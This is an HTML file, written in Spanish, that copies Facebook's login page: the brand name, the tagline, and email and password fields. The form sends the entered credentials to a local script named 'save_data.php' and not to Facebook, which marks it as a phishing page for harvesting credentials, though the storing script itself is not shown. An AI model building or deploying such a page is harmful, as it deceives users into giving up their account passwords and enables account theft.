<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"> 
</head>
<body>
    <div class="container">
        <section class="data-info">
            <div class="titles">
                <h1>facebook</h1>
                <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida</p>
            </div>
            <div class="data-user">
                <form action="save_data.php" method="post">
                    <input type="text" name="correo" placeholder="Correo electrónico o número de telefono">
                    <input type="password" name="password" placeholder="Contraseña">
                    <button style="cursor: pointer;" id="start-session" type="submit" name="session">Iniciar sesión</button>
                    <a href="#">¿Olvidaste tu contraseña?</a>
                    <div id="line">
                        <button style="cursor:pointer;" id="new-account">Crear cuenta nueva</button>
                    </div>
                </form>
                <p><b>Crea una página</b> para una celebridad, una marca o un negocio</p>
            </div>
        </section>
    </div>
</body>
</html>